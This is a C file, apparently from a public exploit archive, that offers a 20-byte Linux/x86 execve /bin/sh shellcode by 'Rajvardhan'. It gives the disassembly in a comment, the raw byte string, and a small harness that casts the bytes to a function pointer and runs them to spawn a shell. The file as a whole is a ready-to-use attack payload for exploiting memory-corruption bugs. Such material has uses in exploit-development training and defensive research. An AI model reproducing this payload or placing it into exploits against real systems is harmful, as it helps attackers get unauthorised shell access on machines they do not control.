/*
# Linux/x86 - execve /bin/sh shellcode (20 bytes)
# Author: Rajvardhan
# Tested on: i686 GNU/Linux
# Shellcode Length: 20

Disassembly of section .text:

08049000 <.text>:
 8049000:       31 c9                   xor    %ecx,%ecx
 8049002:       6a 0b                   push   $0xb
 8049004:       58                      pop    %eax
 8049005:       51                      push   %ecx
 8049006:       68 2f 2f 73 68          push   $0x68732f2f
 804900b:       68 2f 62 69 6e          push   $0x6e69622f
 8049010:       89 e3                   mov    %esp,%ebx
 8049012:       cd 80                   int    $0x80

===============poc by Rajvardhan=========================
*/

#include<stdio.h>
#include<string.h>

unsigned char shellcode[] = "\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
main()
{
printf("Shellcode Length: %d\n", strlen(shellcode));
int (*ret)() = (int(*)())shellcode;
ret();
}